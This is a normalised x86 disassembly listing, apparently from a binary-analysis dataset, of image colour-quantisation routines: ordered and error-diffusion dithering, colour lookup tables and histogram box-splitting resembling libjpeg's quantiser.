call [ ecx + 0x4 ]
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x74 ]
cmp ecx [ esp + 0x10 ]
jg r-xdata
mov eax [ esp ]
mov edx [ eax + 0x74 ]
push edx
mov edx 0x1
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
xor edx edx
mov eax [ esp + 0xc ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x8 ]
mov eax ecx
mov [ esp + 0x2c ] eax
mov edx [ esp + 0x4 ]
lea ecx [ edx + 0x20 ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ eax ]
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x1c ]
cdq
idiv [ esp + 0x18 ]
mov esi eax
xor eax eax
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x2c ]
mov ecx edx
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jge r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x10 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x14 ] eax
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1c ] esi
inc [ esp + 0x10 ]
add [ esp + 0x2c ] 0x4
add [ esp + 0x20 ] 0x4
mov edx [ esp + 0x18 ]
dec edx
push edx
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x4 ]
call sub_45e0c8
mov edi eax
mov ecx [ esp + 0x14 ]
imul ecx esi
mov eax [ esp + 0x28 ]
mov edx eax
mov [ esp + 0x24 ] edx
cmp ecx [ esp + 0xc ]
jge r-xdata
inc [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jl r-xdata
xor eax eax
mov edx [ esp + 0x24 ]
cmp esi eax
jle r-xdata
add ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jl r-xdata
mov ebx [ edx ]
add ebx ecx
add ebx eax
inc eax
push ebx
mov ebx edi
pop ebp
cmp esi eax
mov [ ebp ] bl
jg r-xdata
sub_45e2c4
push ebx
push esi
push edi
add esp 0xffffffe0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1be ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
cmp [ ecx + 0x54 ] 0x1
jne r-xdata
xor edx edx
mov [ esp + 0x14 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ ecx + 0x1c ] eax
mov [ esp + 0x14 ] 0x1fe
mov eax [ esp + 0x4 ]
mov [ eax + 0x1c ] 0x1
jmp r-xdata
mov eax [ esp ]
cmp edi [ eax + 0x74 ]
jl r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x74 ]
mov edx 0x1
push ecx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x18 ]
add ecx 0x100
mov ebx [ eax + 0x4 ]
call [ ebx + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ esp + 0x10 ] ecx
xor edi edi
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x20 ]
mov [ esp + 0x18 ] edx
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x10 ]
cdq
idiv [ esp + 0xc ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x14 ] 0x0
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
xor esi esi
mov ecx [ edx + 0x18 ]
mov edx edi
mov eax [ ecx + edi * 4 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0xc ]
dec eax
xor ecx ecx
push eax
mov eax [ esp + 0x4 ]
call sub_45e0ec
xor ebx ebx
mov edx [ esp + 0x8 ]
mov ecx edx
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x18 ]
add [ eax + edi * 4 ] 0xff
mov edx esi
mov ecx [ esp + 0x1c ]
imul edx [ esp + 0x10 ]
mov [ ecx ] dl
inc ebx
inc [ esp + 0x1c ]
cmp ebx 0xff
jle r-xdata
mov eax [ esp + 0xc ]
mov edx edi
dec eax
inc esi
push eax
mov ecx esi
mov eax [ esp + 0x4 ]
call sub_45e0ec
cmp eax ebx
jl r-xdata
cmp eax ebx
jge r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
inc edi
add [ esp + 0x18 ] 0x4
mov ebx 0x1
mov eax [ esp + 0x8 ]
add eax 0x100
mov edx ebx
mov ecx [ esp + 0x8 ]
neg edx
add ecx edx
mov edx [ esp + 0x8 ]
inc ebx
mov dl [ edx ]
mov [ ecx ] dl
mov ecx [ esp + 0x8 ]
mov dl [ ecx + 0xff ]
mov [ eax ] dl
inc eax
cmp ebx 0xff
jle r-xdata
sub_45e434
push ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
mov ebx edx
mov edx 0x1
add esp 0xfffffff0
mov ecx 0x400
call [ esi ]
mov [ esp ] eax
mov ebp ebx
shl ebp 0x9
add ebp 0xfffffe00
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0xc ] rw-data
mov edx [ esp ]
mov ecx edx
mov [ esp + 0x8 ] ecx
mov eax ecx
cdq
idiv ebp
mov eax ecx
neg eax
cdq
idiv ebp
neg eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
add eax eax
mov edx 0xff
sub edx eax
mov ecx edx
shl ecx 0x8
sub ecx edx
test ecx ecx
jge r-xdata
inc [ esp + 0x4 ]
add [ esp + 0xc ] 0x10
add [ esp + 0x8 ] 0x40
cmp [ esp + 0x4 ] 0x10
jl r-xdata
mov [ esi ] eax
inc edi
add esi 0x4
inc ebx
cmp edi 0x10
jl r-xdata
xor edi edi
mov eax [ esp + 0x8 ]
mov esi eax
mov eax [ esp + 0xc ]
mov ebx eax
mov eax [ esp ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45e4d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1be ]
mov [ esp + 0x4 ] edx
xor ebx ebx
mov eax [ esp + 0x4 ]
lea esi [ eax + 0x20 ]
jmp r-xdata
mov edx [ esp ]
cmp ebx [ edx + 0x74 ]
jl r-xdata
mov edi [ esi ]
xor ecx ecx
xor edx edx
mov eax [ esp + 0x4 ]
add eax 0x20
cmp ebx edx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test ecx ecx
jne r-xdata
cmp edi [ eax ]
jne r-xdata
mov [ esi + 0x14 ] ecx
inc ebx
add esi 0x4
mov edx edi
mov eax [ esp ]
call sub_45e434
mov ecx eax
inc edx
add eax 0x4
cmp ebx edx
jg r-xdata
mov ecx [ eax + 0x14 ]
jmp r-xdata
sub_45e53c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov ebx [ eax + 0x1be ]
mov ebx [ ebx + 0x18 ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x6c ]
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0x74 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov ecx [ edx ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
inc [ ebp - 0xc ]
add [ ebp - 0x20 ] 0x4
add [ ebp - 0x1c ] 0x4
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
xor esi esi
xor edx edx
mov eax [ ebp - 0x4 ]
cmp edx [ ebp - 0x18 ]
jge r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov [ edx ] al
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
ja r-xdata
xor ebx ebx
mov edi [ eax ]
mov bl [ ecx ]
inc ecx
add eax 0x4
inc edx
movzx ebx [ edi + ebx ]
add esi ebx
cmp edx [ ebp - 0x18 ]
jl r-xdata
sub_45e5dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx [ eax + 0x1be ]
mov esi [ ebx + 0x18 ]
mov edi [ esi ]
mov [ ebp - 0x4 ] edi
mov edi [ esi + 0x4 ]
mov [ ebp - 0x8 ] edi
mov ebx [ esi + 0x8 ]
mov [ ebp - 0xc ] ebx
mov eax [ eax + 0x6c ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
mov edx [ ebp - 0x1c ]
mov ecx [ edx ]
mov esi [ ebp - 0x14 ]
test esi esi
jbe r-xdata
inc [ ebp - 0x10 ]
add [ ebp - 0x1c ] 0x4
add [ ebp - 0x18 ] 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
xor edx edx
mov ebx [ ebp - 0x4 ]
mov dl [ eax ]
inc eax
mov edi [ ebp - 0x8 ]
dec esi
movzx edx [ ebx + edx ]
xor ebx ebx
mov bl [ eax ]
inc eax
movzx ebx [ edi + ebx ]
add edx ebx
xor ebx ebx
mov bl [ eax ]
mov edi [ ebp - 0xc ]
inc eax
movzx ebx [ edi + ebx ]
add edx ebx
mov [ ecx ] dl
inc ecx
test esi esi
ja r-xdata
sub_45e678
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx [ eax + 0x1be ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x74 ]
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0x6c ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x20 ]
push edx
push 0x0
mov ecx [ ebp - 0x24 ]
mov eax [ ecx ]
push eax
call sub_46a318
mov edx [ ebp - 0x4 ]
xor eax eax
add esp 0xc
mov ecx [ edx + 0x30 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
lea ecx [ edx + 0x34 ]
mov [ ebp - 0x30 ] ecx
mov eax [ ebp - 0x24 ]
mov edx eax
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x34 ]
mov eax ecx
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x14 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
inc ecx
and ecx 0xf
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x30 ] edx
inc [ ebp - 0x1c ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x24 ] 0x4
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x18 ]
mov edx [ ecx ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
add edx [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x30 ]
mov ebx [ ebp - 0x10 ]
shl ebx 0x6
mov eax [ eax ]
add eax ebx
mov [ ebp - 0xc ] eax
xor eax eax
mov esi [ ebp - 0x20 ]
test esi esi
jbe r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x14 ]
jl r-xdata
xor ebx ebx
mov edi [ ebp - 0x8 ]
mov bl [ edx ]
dec esi
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0xc ]
pop edi
mov ebx [ ebx + eax * 4 ]
inc eax
and eax 0xf
mov bl [ edi + ebx ]
add [ ecx ] bl
inc ecx
add edx [ ebp - 0x14 ]
test esi esi
ja r-xdata
sub_45e78c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx [ eax + 0x1be ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x18 ]
mov esi [ ebx ]
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x4 ]
mov [ ebp - 0xc ] esi
mov ebx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov eax [ eax + 0x6c ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x30 ]
mov esi [ edx ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x34 ]
shl edx 0x6
mov eax [ eax ]
add ecx edx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x38 ]
add ecx edx
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x3c ]
add ecx edx
xor edx edx
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x28 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
inc eax
and eax 0xf
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x30 ] eax
inc [ ebp - 0x24 ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x24 ]
cmp edx [ ebp + 0x8 ]
jl r-xdata
xor ecx ecx
mov ebx [ ebp - 0x8 ]
mov cl [ eax ]
inc eax
mov edi [ ebp - 0xc ]
lea ecx [ ebx + ecx ]
mov ebx [ ebp - 0x14 ]
mov ebx [ ebx + edx * 4 ]
movzx ecx [ ecx + ebx ]
xor ebx ebx
mov bl [ eax ]
inc eax
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0x18 ]
pop edi
mov ebx [ ebx + edx * 4 ]
movzx ebx [ edi + ebx ]
add ecx ebx
xor ebx ebx
mov bl [ eax ]
mov edi [ ebp - 0x10 ]
inc eax
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0x1c ]
pop edi
mov ebx [ ebx + edx * 4 ]
inc edx
and edx 0xf
movzx ebx [ edi + ebx ]
add ecx ebx
mov [ esi ] cl
inc esi
dec [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x0
ja r-xdata
sub_45e8a4
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
mov ebx [ eax + 0x1be ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x74 ]
mov [ ebp - 0x24 ] ebx
mov ebx [ eax + 0x6c ]
mov [ ebp - 0x38 ] ebx
mov eax [ eax + 0x136 ]
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x40 ] ecx
mov eax [ ebp - 0x30 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x38 ]
push edx
push 0x0
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
push eax
call sub_46a318
add esp 0xc
xor edx edx
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + 0x44 ]
mov [ ebp - 0x4c ] eax
mov edx [ ebp - 0x40 ]
mov ecx edx
mov [ ebp - 0x48 ] ecx
mov eax [ ebp - 0x50 ]
mov edx eax
mov [ ebp - 0x44 ] edx
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x24 ]
jge r-xdata
xor eax eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov edx [ eax ]
add edx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x48 ]
mov eax [ ecx ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x54 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x54 ] eax
inc [ ebp - 0x30 ]
add [ ebp - 0x50 ] 0x4
add [ ebp - 0x40 ] 0x4
mov eax [ ebp - 0x30 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
inc eax
mov esi 0x1
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x4c ]
mov ecx [ edx ]
mov eax [ ebp - 0x38 ]
or esi 0xffffffff
dec eax
mov edx eax
imul edx [ ebp - 0x24 ]
add [ ebp - 0x14 ] edx
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x38 ]
inc eax
add eax eax
mov ecx [ edx ]
add ecx eax
jmp r-xdata
mov ax [ ebp - 0xc ]
mov [ ecx ] ax
inc [ ebp - 0x2c ]
add [ ebp - 0x4c ] 0x4
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
movsx edx [ ecx + esi * 2 ]
add eax edx
mov edx [ ebp - 0x14 ]
add eax 0x8
mov ebx [ ebp - 0x18 ]
movzx edx [ edx ]
sar eax 0x4
add eax edx
mov edx [ ebp - 0x3c ]
movzx eax [ edx + eax ]
mov edx [ ebp - 0x1c ]
movzx edx [ edx + eax ]
add [ ebx ] dl
mov ebx [ ebp - 0x20 ]
movzx edx [ ebx + edx ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov edx eax
mov bx [ ebp - 0xc ]
add edx edx
add eax edx
add bx ax
add eax edx
mov [ ecx ] bx
mov ebx [ ebp - 0x8 ]
add ebx eax
add eax edx
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ebx
mov edx [ ebp - 0x28 ]
add [ ebp - 0x14 ] edx
add [ ebp - 0x18 ] esi
dec [ ebp - 0x34 ]
mov edx esi
add edx edx
add ecx edx
cmp [ ebp - 0x34 ] 0x0
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x2c ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x2c ]
mov edx [ edx + eax * 4 ]
xor eax eax
mov [ ebp - 0x20 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x38 ]
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub_45ea64
push ebx
push esi
mov ebx eax
push edi
push ebp
push ecx
mov eax [ ebx + 0x1be ]
mov edx [ ebx + 0x6c ]
add edx edx
add edx 0x4
xor edi edi
mov [ esp ] edx
lea esi [ eax + 0x44 ]
jmp r-xdata
cmp edi [ ebx + 0x74 ]
jl r-xdata
mov eax ebx
mov ecx [ esp ]
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov [ esi ] eax
inc edi
add esi 0x4
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45eaa4
push ebx
mov ebx eax
push esi
push edi
push ebp
mov esi [ ebx + 0x1be ]
mov eax [ esi + 0x10 ]
mov [ ebx + 0x84 ] eax
mov edx [ esi + 0x14 ]
mov [ ebx + 0x80 ] edx
mov ecx [ ebx + 0x54 ]
sub ecx 0x1
jb r-xdata
cmp [ ebx + 0x74 ] 0x3
jne r-xdata
je r-xdata
mov [ esi + 0x4 ] sub_45e53c
jmp r-xdata
mov [ esi + 0x4 ] sub_45e5dc
jmp r-xdata
cmp [ ebx + 0x74 ] 0x3
jne r-xdata
dec ecx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_45e678
mov [ esi + 0x4 ] sub_45e78c
jmp r-xdata
mov [ esi + 0x4 ] sub_45e8a4
xor edx edx
mov [ esi + 0x54 ] edx
cmp [ esi + 0x44 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ esi + 0x34 ] 0x0
jne r-xdata
mov eax ebx
call sub_45e2c4
xor eax eax
mov [ esi + 0x30 ] eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ebp [ ebx + 0x6c ]
lea eax [ esi + 0x44 ]
add ebp ebp
mov esi eax
add ebp 0x4
xor edi edi
jmp r-xdata
mov eax ebx
call sub_45ea64
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x2f
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_45e4d4
jmp r-xdata
cmp edi [ ebx + 0x74 ]
jl r-xdata
push ebp
push 0x0
mov edx [ esi ]
push edx
call sub_46a318
add esp 0xc
inc edi
add esi 0x4
jmp r-xdata
sub_45eb94
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x58
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1be ] eax
mov [ eax ] sub_45eaa4
mov [ eax + 0x8 ] sub_45eb80
mov [ eax + 0xc ] sub_45eb84
xor edx edx
xor ecx ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x34 ] ecx
cmp [ ebx + 0x74 ] 0x4
jle r-xdata
cmp [ ebx + 0x5c ] 0x100
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x36
mov [ eax + 0x18 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_45e110
mov eax ebx
call sub_45e2c4
cmp [ ebx + 0x54 ] 0x2
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x38
mov [ eax + 0x18 ] 0x100
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov eax ebx
call sub_45ea64
sub_45ec28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ecx [ eax + 0x1be ]
mov ebx [ ecx + 0x18 ]
mov eax [ eax + 0x6c ]
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
test ecx ecx
jbe r-xdata
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx esi [ eax + 0x1 ]
xor edx edx
mov dl [ eax ]
sar edx 0x3
sar esi 0x2
shl esi 0x6
mov edx [ ebx + edx * 4 ]
add edx esi
movzx esi [ eax + 0x2 ]
sar esi 0x3
add esi esi
add edx esi
inc [ edx ]
mov si [ edx ]
test si si
ja r-xdata
add eax 0x3
dec ecx
test ecx ecx
ja r-xdata
dec [ edx ]
sub_45ecac
push ebx
push esi
push edi
xor ebx ebx
xor edi edi
xor ecx ecx
cmp edx ecx
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x1c ]
cmp ebx esi
jge r-xdata
inc ecx
add eax 0x20
cmp edx ecx
jg r-xdata
cmp [ eax + 0x18 ] 0x0
jle r-xdata
mov edi eax
mov ebx esi
sub_45ecd8
push ebx
push esi
push edi
xor ebx ebx
xor edi edi
xor ecx ecx
cmp edx ecx
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x18 ]
cmp ebx esi
jge r-xdata
inc ecx
add eax 0x20
cmp edx ecx
jg r-xdata
mov edi eax
mov ebx esi
sub_45ed00
push ebx
push esi
push edi
add esp 0xffffffb8
mov [ esp ] edx
mov eax [ eax + 0x1be ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x4 ] eax
mov edx [ esp ]
mov ecx [ edx ]
mov [ esp + 0x8 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x4 ]
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xc ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
mov esi [ ecx + 0x14 ]
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x8 ]
jle r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x8 ]
jle r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ ecx + edx * 4 ]
mov [ esp + 0x24 ] eax
cmp edx [ esp + 0xc ]
jg r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ esp + 0x10 ]
jle r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x2c ] ecx
cmp edx [ esp + 0x8 ]
jl r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x24 ]
mov ecx eax
mov [ esp + 0x20 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov edx [ esp + 0x14 ]
cmp edx [ esp + 0x10 ]
jle r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx [ esp + 0x14 ]
jg r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x2c ]
mov ecx eax
mov [ esp + 0x28 ] ecx
cmp ebx [ esp + 0x14 ]
jg r-xdata
inc edx
add [ esp + 0x24 ] 0x4
cmp edx [ esp + 0xc ]
jle r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
cmp esi [ esp + 0x18 ]
jle r-xdata
mov ebx [ esp + 0x14 ]
cmp ebx [ esp + 0x10 ]
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x30 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
dec edx
add [ esp + 0x2c ] 0xfffffffc
cmp edx [ esp + 0x8 ]
jge r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
cmp esi [ esp + 0x18 ]
jle r-xdata
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
lea ecx [ eax + edx * 4 ]
mov [ esp + 0x34 ] ecx
cmp edx [ esp + 0xc ]
jg r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ eax ]
mov eax ebx
shl eax 0x6
add ecx eax
mov eax [ esp + 0x18 ]
add eax eax
add ecx eax
mov eax [ esp + 0x18 ]
cmp esi eax
jl r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jle r-xdata
mov di [ ecx ]
add ecx 0x2
test di di
je r-xdata
inc eax
cmp esi eax
jge r-xdata
mov [ esp + 0x8 ] edx
mov eax [ esp ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
sub eax [ esp + 0x8 ]
sub edx [ esp + 0x10 ]
shl eax 0x3
mov ecx esi
mov ebx eax
imul ebx eax
shl edx 0x2
sub ecx [ esp + 0x18 ]
shl ecx 0x3
add ecx ecx
lea edx [ edx + edx * 2 ]
mov eax edx
imul edx
mov edx ecx
add ebx eax
imul edx ecx
mov ecx [ esp ]
add ebx edx
xor eax eax
mov [ ecx + 0x18 ] ebx
